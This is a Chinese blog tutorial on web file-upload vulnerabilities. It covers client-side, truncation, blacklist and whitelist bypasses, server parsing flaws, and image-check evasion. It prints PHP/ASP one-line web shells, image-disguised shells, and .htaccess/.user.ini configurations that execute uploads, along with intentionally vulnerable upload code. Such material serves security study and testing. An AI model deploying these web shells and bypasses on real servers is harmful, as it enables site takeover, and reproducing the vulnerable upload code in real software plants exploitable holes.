<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>Web文件上传 · Mini's blog</title><meta name="description" content="文件上传1. 基础PHP文件上传通常使用 move_uploaded_file 方法配合 $_FILES 变量实现
1234&amp;lt;?php$file = $_FILES[&amp;#x27;file&amp;#x27;];move_uploaded_file($file[&amp;#x27;tmp_name&amp;#x27;]"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Web文件上传</a></h3></div><div class="post-content"><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="1-基础"><a href="#1-基础" class="headerlink" title="1. 基础"></a>1. 基础</h2><p>PHP文件上传通常使用 <strong>move_uploaded_file</strong> 方法配合 <strong>$_FILES</strong> 变量实现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-1-小马"><a href="#1-1-小马" class="headerlink" title="1.1 小马"></a>1.1 小马</h3><ul>
<li>小马通常指一句话木马，就是一句简单的代码</li>
<li>其主要是为了绕过waf的检测</li>
<li>主要通过GET、POST、COOKIE三种方式提交数据</li>
<li>用 $_GET[]、$_POST[]、$_COOKIE[]接收数据，并把接收到的数据传递给一句话木马中执行命令的函数，进而执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP: &lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line">ASP: &lt;% eval request(&quot;cmd&quot;) %&gt;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-大马"><a href="#1-2-大马" class="headerlink" title="1.2 大马"></a>1.2 大马</h3><p>代码量较大，功能丰富。每个团队都有自己定制的大马</p>
<h2 id="2-客户端绕过"><a href="#2-客户端绕过" class="headerlink" title="2. 客户端绕过"></a>2. 客户端绕过</h2><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名是否合法，有白名单和黑名单两种形式</p>
<ul>
<li>删除浏览器事件</li>
<li>利用Burpsuit抓包修改文件后缀名</li>
<li>构造上传表单</li>
</ul>
<h2 id="3-截断绕过"><a href="#3-截断绕过" class="headerlink" title="3. 截断绕过"></a>3. 截断绕过</h2><h3 id="3-1-00截断"><a href="#3-1-00截断" class="headerlink" title="3.1 00截断"></a>3.1 00截断</h3><p><em>截断条件</em>：PHP版本小于5.3.4、magic_quotes_gpc 为OFF状态；Java中，jdk7u40以下版本存在00截断问题</p>
<p>C语言中， <strong>“\0”</strong> 是字符串的结束符，如果用户能够传入 <strong>“\0”</strong> ,就能实现00截断</p>
<p>00截断的场景为：后端先获取用户上传的文件名（如 x.php\00.jpg），再根据文件名获得实际后缀为jpg。通过后缀白名单校验后，在实际保存文件时发生截断，使得最终保存的文件为 x.php。</p>
<p><em>注意</em>：PHP在使用 <strong>$_FILES</strong> 实现文件上传时并不存在00截断问题，这是由于PHP的底层语言为<em>C语言</em>，在注册 <strong>$_FILES</strong> 全局变量时已经产生了截断。（如上传文件名为 x.php\00.jpg 的文件，而注册到 $_FILES 全局变量值为 x.php）</p>
<h3 id="3-2-转换字符集造成的截断"><a href="#3-2-转换字符集造成的截断" class="headerlink" title="3.2 转换字符集造成的截断"></a>3.2 转换字符集造成的截断</h3><p><em>截断条件</em>：PHP版本小于5.4</p>
<p>虽然PHP的 <strong>$_FILES</strong> 文件上传不存在00截断问题，不过在文件名进行<strong>字符集转换</strong>的场景下也可能出现截断绕过。</p>
<p>PHP在实现字符集转换时通常使用 <strong>iconv()</strong> 函数，UTF-8在单字节时允许的字符范围为 <strong>0x00-0x7F</strong> ，如果转换的字符不在该范围内，则会造成 <strong>PHP_ICONV_ERR_ILLEGAL_SEQ</strong> 异常，低版本PHP在这个异常后不再处理后面字符，因此造成截断问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = @iconv(&quot;utf-8&quot;,&quot;GBK&quot;,$filename);</span><br></pre></td></tr></table></figure>

<p>适用场景为：现在后端获取上传的文件后缀，经过后缀白名单判断后，如果有对文件名进行<strong>字符集转换</strong>操作，那么可能造成截断问题（如上传 x.php\x99.jpg ，最终保存的文件名为 x.php）</p>
<p>可以使用burpsuit来对可以利用的字符进行测试</p>
<p>此部分方法应用链接：<a target="_blank" rel="noopener" href="http://www.yulegeyu.com/2019/06/18/Metinfo6-Arbitrary-File-Upload-Via-Iconv-Truncate/">Metinfo6 Arbitrary File Upload Via Iconv Truncate</a></p>
<h2 id="4-黑名单绕过"><a href="#4-黑名单绕过" class="headerlink" title="4. 黑名单绕过"></a>4. 黑名单绕过</h2><p>PHP常见的可执行后缀：php3、php5、phtml、pht、php1、php2等</p>
<p>ASP常见的可执行后缀：cdx、cer、asa、aspx等</p>
<p>JSP常见的可执行后缀：jspx、jspf等</p>
<h3 id="4-1-Windows系统特性"><a href="#4-1-Windows系统特性" class="headerlink" title="4.1 Windows系统特性"></a>4.1 Windows系统特性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1.php.&quot;   // windows会对文件中的点进行自动去除</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1.php::$DATA&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1.php &quot;   // 空格绕过</span><br></pre></td></tr></table></figure>


<p>Windows环境下，文件名不区分大小写，而 <strong>in_array</strong> 区分大小写，所以可以尝试大小写后缀名绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(in_array($ext, array(&#x27;php&#x27;, &#x27;asp&#x27;, &#x27;jsp&#x27;)))&#123;</span><br><span class="line">    exit(&quot;Forbid!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-上传-htaccess-绕过黑名单"><a href="#4-2-上传-htaccess-绕过黑名单" class="headerlink" title="4.2 上传 .htaccess 绕过黑名单"></a>4.2 上传 .htaccess 绕过黑名单</h3><p><strong>.htaccess</strong> 文件是Apace服务器中的一个配置文件的默认名称（可以在Apache主配置文件中通过 <strong>AccessFileName</strong> 指令修改其名称）。</p>
<p>Apache主配置文件中通过 <strong>AllowOverride</strong> 指令配置 <strong>.htaccess</strong> 文件中可以覆盖主配置文件中的那些指令。在低于2.3.8版本中， <strong>AllowOverride</strong> 指令默认为All，在2.3.9及更高版本中默认为None。</p>
<p>在低于2.3.8版本中，可以尝试先上传 <strong>.htaccess</strong> 文件修改部分配置，使用 <strong>SetHandler</strong> 指令使PHP解析指定文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面这段代码的意思是，一个文件名只要包含“shell”这个字符串的任意文件，就调用php的解析器来解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files &quot;Shell.txt&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line">AddHandler php5-script .php</span><br><span class="line"></span><br><span class="line">// AddHandler指令的作用是在文件扩展名与特定的处理器之间建立映射</span><br></pre></td></tr></table></figure>

<blockquote>
<p>mac 上传页面显示隐藏文件：<code>shift</code>+<code>command</code>+<code>.</code></p>
</blockquote>
<h3 id="4-3-上传-user-ini-绕过黑名单"><a href="#4-3-上传-user-ini-绕过黑名单" class="headerlink" title="4.3 上传 .user.ini 绕过黑名单"></a>4.3 上传 .user.ini 绕过黑名单</h3><p>PHP 5.3.0 起支持每个目录的INI文件配置，此类文件仅被 CGI&#x2F;FastCGI SAPI 处理，只要是以 fastcgi 运行的 php 都可以用这个方法，nginx 和 iis 下都可以。默认文件名为 <strong>.user.ini</strong> </p>
<p>因此，利用 <strong>.user.ini</strong> 中的两个配置选项可以构造后门</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1</span>.php		<span class="comment"># 是在文件前插入</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">auto_apeend_file = <span class="number">1</span>.php		<span class="comment"># 文件最后才插入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在访问该网站的php文件时，会自动先加载1.php</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这两个选项的作用是，在 php 文件加载前，提前加载一个文件，如同 <code>require</code> 函数</p>
</blockquote>
<p>于是，可以往 <strong>.user.ini</strong> 中写入如下内容并上传：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>
<p>利用条件：</p>
<ul>
<li>在  user.ini  中设置 auto_prepend_file&#x3D;a.gif</li>
<li>在 a.gif 中写入一句话木马</li>
<li>在当前目录下还有一个 php 文件，如 index.php</li>
</ul>
<blockquote>
<p>如果这三个条件在同一个目录下面，就会出先问题，这里就相当于在 index.php 中写了 <code>include &quot;a.gif&quot;</code>  , 可以进行文件包含，导致的后果是：当我们对目录中的 index.php 进行访问的时候，会调用 .usre.ini  中的文件把 a.gif 文件以 php 的形式进行读取，造成 userini 的漏洞</p>
</blockquote>
<h3 id="4-4-Apache-CVE-2017-15715漏洞"><a href="#4-4-Apache-CVE-2017-15715漏洞" class="headerlink" title="4.4 Apache CVE-2017-15715漏洞"></a>4.4 Apache CVE-2017-15715漏洞</h3><p>在HTTPD 2.4.0到2.4.29版本中， <strong>FilesMatch</strong> 指令正则中 <strong>“$”</strong> 能够匹配到换行符，可能导致黑名单绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>以上Apache配置，原意是为了只解析以 <strong>.php</strong> 结尾的文件，但由于该漏洞导致 <strong>.php\n</strong> 结尾的文件也能被解析，因此绕过黑名单。</p>
<p>不过在 PHP <strong>$_FILES</strong> 上传的过程中， <strong>$_FILES[‘name’]</strong> 会清除 <strong>“\n”</strong> 字符导致不能利用，但是 <strong>file_put_contents</strong> 实现上传的方法可以利用。代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&#x27;.&#x27;</span>),<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ext</span> != <span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Forbid!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的测试代码中可以通过上传 <strong>x.php\n</strong> 来进行黑名单绕过</p>
<h2 id="5-白名单绕过"><a href="#5-白名单绕过" class="headerlink" title="5. 白名单绕过"></a>5. 白名单绕过</h2><p>通常来说，白名单绕过需要借助Web服务器的各解析漏洞或ImageMagick等组件漏洞</p>
<h3 id="5-1-Web服务器解析漏洞"><a href="#5-1-Web服务器解析漏洞" class="headerlink" title="5.1 Web服务器解析漏洞"></a>5.1 Web服务器解析漏洞</h3><h4 id="5-1-1-IIS解析漏洞"><a href="#5-1-1-IIS解析漏洞" class="headerlink" title="5.1.1 IIS解析漏洞"></a>5.1.1 IIS解析漏洞</h4><ul>
<li>目录解析</li>
</ul>
<p>IIS 6中存在目录解析漏洞： <strong>“*.asp”</strong> 文件夹下的所有文件都会被当作asp脚本进行解析</p>
<ul>
<li>文件解析</li>
</ul>
<p>IIS 5.x - 6.x 中存在文件解析漏洞：服务器默认不解析 <strong>“;”</strong> 后面的内容。例如文件名为 <strong>“xx.asp;a.jpg”</strong> 的文件会被解析成ASP文件，而上传 <strong>“xx.asp;a.jpg”</strong> 可以通过白名单的校验。</p>
<h4 id="5-1-2-Nginx解析漏洞"><a href="#5-1-2-Nginx解析漏洞" class="headerlink" title="5.1.2 Nginx解析漏洞"></a>5.1.2 Nginx解析漏洞</h4><p>Nginx的解析漏洞是由于配置不当造成的问题，在Nginx未配置 <strong>try_files</strong> 且 <strong>FPM</strong> 未设置 <strong>security.limit_extensions</strong> 的场景下，可能出现解析漏洞。Nginx的配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php &#123;</span><br><span class="line">    # try_files     $uri =404;</span><br><span class="line">    fastcgi_pass</span><br><span class="line">    unix:/Applications/MAMP/Library/logs/fastcgi/nginxFastCFI_php5.3.14.sock;</span><br><span class="line">        fastcgi     SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">        include     /Application/MAMP/conf/nginx/fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先上传 <strong>x.jpg</strong> ，再访问 <strong>x.jpg&#x2F;1.php</strong> ，location为 <strong>.php</strong> 结尾，会交给FPM处理，此时 <strong>$fastcgi_script_name</strong> 的值为 <strong>x.jpg&#x2F;1.php</strong> ;在PHP开启 <strong>cgi.fix_pathinfo</strong> 配置时， <strong>x.jpg&#x2F;1.php</strong> 文件不存在，开始 fallback 去掉最右边的 “&#x2F;“ 及其后续内容，继续判断 x.jpg 是否存在；这时若存在，则会用PHP处理该文件</p>
<h3 id="5-2-Apache解析漏洞"><a href="#5-2-Apache解析漏洞" class="headerlink" title="5.2 Apache解析漏洞"></a>5.2 Apache解析漏洞</h3><h4 id="5-2-1-多后缀文件解析漏洞"><a href="#5-2-1-多后缀文件解析漏洞" class="headerlink" title="5.2.1 多后缀文件解析漏洞"></a>5.2.1 多后缀文件解析漏洞</h4><p>Apache中，单个文件支持拥有多个后缀，如果多个后缀都存在对应的 <strong>handler</strong> 或 <strong>media-type</strong> ，那么对应的 <strong>handler</strong> 会处理当前文件。</p>
<p>如果在Apache的conf中有这样的配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Addhandler php5-script .php</span><br><span class="line">AddHandler application/x-httped-php .php</span><br></pre></td></tr></table></figure>

<p>那么即使文件名是 <strong>xxx.php.jpg</strong> 也会以php来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php</span><br><span class="line">TypesConfig /Applications/MAMP/conf/apache/mime.types</span><br></pre></td></tr></table></figure>

<p>在上面的Apache的配置下，当使用 <strong>AddType</strong> 时，多后缀文件会从最右后缀开始识别，如果后缀不存在 <strong>MIME type</strong> 或 <strong>Handler</strong> ，则会继续往左识别后缀，直到后缀有对应的 <strong>MIME type</strong> 或 <strong>Handler</strong> 。如 <strong>test.php.qwe.asd.sdf</strong></p>
<h2 id="6-文件禁止访问绕过"><a href="#6-文件禁止访问绕过" class="headerlink" title="6. 文件禁止访问绕过"></a>6. 文件禁止访问绕过</h2><p>测试中遇到一些允许任意上传的功能，在访问上传的脚本文件时发现并不能被解析或访问，通常是在Web服务器中配置上传目录下的脚本文件禁止访问。在上传目录下的文件无法被访问时，最好的绕过办法肯定是进行目录穿越上传到根目录，如尝试上传 <strong>..&#x2F;x.php</strong> 等类似文件。</p>
<p>这种方法对 <strong>$_FILES</strong> 上传是不能实现的，原因在于，PHP在注册 <strong>$_FILES[‘name’]</strong> 时调用 <strong>_basename()</strong> 方法处理了文件名，它会获得最后一个 <strong>“&#x2F;“</strong> 或 <strong>“\“</strong> 后面的字符，所以上传 <strong>..&#x2F;x.php</strong> 并不能实现目录穿越，因为在经过 <strong>_basename()</strong> 后注册到 <strong>$_FILES[‘name’]</strong> 的值为 <strong>x.php</strong></p>
<h3 id="6-1-htaccess-禁止脚本文件执行绕过"><a href="#6-1-htaccess-禁止脚本文件执行绕过" class="headerlink" title="6.1 .htaccess 禁止脚本文件执行绕过"></a>6.1 .htaccess 禁止脚本文件执行绕过</h3><p><del>在低于9.22版本的 <strong>jQuery-File-Upload</strong> 在自带的上传脚本 <strong>(server&#x2F;php&#x2F;index.php)</strong> 中，验证上传文件</del></p>
<h3 id="6-2-配合文件包含绕过"><a href="#6-2-配合文件包含绕过" class="headerlink" title="6.2 配合文件包含绕过"></a>6.2 配合文件包含绕过</h3><p>在PHP文件包含中，程序一般会限制包含的文件后缀只能为 “.php” 或其它特定后缀。在00截断越来越罕见的今天，如果上传目录脚本文件无法被访问或不被解析，那么可以上传一个PHP文件配合文件包含实现解析。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//page.php</span></span><br><span class="line"><span class="comment">//localhost/book/page.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$dir</span> = <span class="keyword">__DIR__</span></span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$page</span>.<span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x.php</span></span><br><span class="line"><span class="comment">//localhost/book/upload/x.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/asd/page.php?page=upload/x</span><br></pre></td></tr></table></figure>

<h2 id="7-绕过图片验证实现代码执行"><a href="#7-绕过图片验证实现代码执行" class="headerlink" title="7. 绕过图片验证实现代码执行"></a>7. 绕过图片验证实现代码执行</h2><h3 id="7-1-文件相关信息检测"><a href="#7-1-文件相关信息检测" class="headerlink" title="7.1 文件相关信息检测"></a>7.1 文件相关信息检测</h3><h4 id="7-1-1-getimagesize绕过"><a href="#7-1-1-getimagesize绕过" class="headerlink" title="7.1.1 getimagesize绕过"></a>7.1.1 getimagesize绕过</h4><p><strong>getimagesize</strong> 函数用来测定任何图像文件的大小并返回图像的尺寸以及文件类型，如果文件不是一张有效的图像文件，则返回FALSE并产生一条E_WARNING级错误。</p>
<p><strong>getimagesize</strong> 的绕过比较简单，只要将PHP代码添加到图片内容后就能成功绕过。</p>
<h4 id="7-1-2-文件幻数检测"><a href="#7-1-2-文件幻数检测" class="headerlink" title="7.1.2 文件幻数检测"></a>7.1.2 文件幻数检测</h4><p>检测文件内容开始处的文件幻数</p>
<p>要绕过文件幻数检测就要在文件开头写下面的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E0 00 10 4A 46 49 46           //jpg</span><br><span class="line">47 49 46 38 39 61                       //gif (GIF89a)</span><br><span class="line">89 50 4E 47                             //png</span><br></pre></td></tr></table></figure>

<p>然后在幻数后加上自己的一句话代码就可以了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="7-1-3-图片马绕过"><a href="#7-1-3-图片马绕过" class="headerlink" title="7.1.3 图片马绕过"></a>7.1.3 图片马绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+1.php/a 2.jpg      <span class="comment"># /b 指定以二进制格式复制、合并文件，用于图像、声音类文件；/a 指定以ASCII格式复制、合并文件，用于txt等文档类文件</span></span><br></pre></td></tr></table></figure>

<p>上传图片马无法直接利用，需要配合文件解析或文件包含漏洞</p>
<h4 id="7-1-4-绕过-lt-php"><a href="#7-1-4-绕过-lt-php" class="headerlink" title="7.1.4 绕过 &lt;? php"></a>7.1.4 绕过 <code>&lt;?</code> <code>php</code></h4><p>绕过 <code>&lt;?</code> 可以使用下面语句绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>绕过 <code>php</code> 可以使用下面语句绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);=<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-2-imagecreatefromjpeg绕过"><a href="#7-2-imagecreatefromjpeg绕过" class="headerlink" title="7.2 imagecreatefromjpeg绕过"></a>7.2 imagecreatefromjpeg绕过</h3><p><strong>imagecreatefromjpeg</strong> 方法会渲染图像生成新的图像，在图像中注入脚本代码经过渲染后，脚本代码会消失</p>
<p>该方法也有了成熟的绕过脚本：<a target="_blank" rel="noopener" href="https://github.com/BlackFan/jpg_payload">jpg_payload</a></p>
<p>绕过需要先上传正常图片文件，再下载回渲染后的图片，运行 <strong>jpg_payload.php</strong> 处理下载回来的图片，将代码注入图片中，然后上传新生成的图片，这样经过 <strong>imagecreatefromjpeg</strong> 后注入的脚本代码依然存在</p>
<h2 id="8-file-put-contents-文件上传"><a href="#8-file-put-contents-文件上传" class="headerlink" title="8. file_put_contents 文件上传"></a>8. file_put_contents 文件上传</h2><h3 id="8-1-绕过黑名单"><a href="#8-1-绕过黑名单" class="headerlink" title="8.1 绕过黑名单"></a>8.1 绕过黑名单</h3><p>在file_put_contents 方法中，在文件名可控的情况下，能够实现目录穿越</p>
<p>如下面的代码出现在Nginx+PHP环境中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$name</span>,<span class="string">&#x27;.&#x27;</span>),<span class="number">1</span>));</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;phtml&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;forbid&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

